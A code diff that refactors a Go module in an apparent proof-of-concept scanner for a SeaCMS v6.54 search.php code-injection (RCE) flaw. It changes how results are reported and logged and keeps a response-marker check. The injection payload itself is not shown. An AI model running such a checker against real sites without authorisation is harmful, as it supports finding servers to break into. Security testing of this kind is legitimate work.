@@ -8,12 +8,12 @@ import (
 	"time"
 
 	"../logger"
-	"github.com/gorilla/websocket"
+	"../util"
 )
 
 // SeaCMSv654 search.php code injection.
 type SeaCMSv654 struct {
-	mconn       *muxConn
+	mconn       *util.MuxConn
 	target      string
 	Exploitable bool
 }
@@ -24,21 +24,24 @@ func NewSeaCMSv654() *SeaCMSv654 {
 }
 
 // Set implements PoC interface.
-// Params should be {conn *websocket.Conn, target string}
+// Params should be {target string}
 func (s *SeaCMSv654) Set(v ...interface{}) {
-	s.mconn = &muxConn{conn: v[0].(*websocket.Conn)}
 	s.target = v[0].(string)
 }
 
 // Report implements PoC interface.
 func (s *SeaCMSv654) Report() map[string]interface{} {
-	return nil
+	return map[string]interface{}{
+		"host":        s.target,
+		"exploitable": s.Exploitable,
+	}
 }
 
 // Run implements PoC interface.
 func (s *SeaCMSv654) Run() {
 	logger.Green.Println("Checking SeaCMSv6.54 RCE...")
 	s.check()
+	logger.Blue.Println(s.target, s.Exploitable)
 }
 
 func (s *SeaCMSv654) check() {
@@ -65,7 +68,6 @@ func (s *SeaCMSv654) check() {
 	resp, err := client.Do(req)
 	if err != nil {
 		logger.Red.Println(err)
-		s.Exploitable = false
 		return
 	}
 
@@ -73,12 +75,5 @@ func (s *SeaCMSv654) check() {
 	resp.Body.Close()
 	if strings.Contains(string(body), "AssassinGooo") {
 		s.Exploitable = true
-
-		logger.Blue.Println(s.target)
-		ret := map[string]interface{}{
-			"host":        s.target,
-			"exploitable": s.Exploitable,
-		}
-		s.mconn.send(ret)
 	}
 }
